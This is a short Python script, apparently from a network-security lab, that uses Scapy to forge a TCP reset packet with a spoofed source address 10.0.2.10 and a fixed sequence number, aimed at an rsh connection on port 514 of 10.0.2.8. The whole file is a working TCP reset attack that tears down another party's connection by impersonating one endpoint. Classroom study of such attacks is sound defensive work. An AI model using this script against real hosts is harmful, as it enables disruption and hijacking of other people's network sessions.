#!usr/bin/python3
from scapy.all import *
import sys

print("Sending Spoofed RST Packet ...")
IPLayer = IP(src="10.0.2.10", dst="10.0.2.8")
TCPLayer = TCP(sport=1023,dport=514,flags="R", seq=778933537)
pkt = IPLayer/TCPLayer
send(pkt,verbose=0)
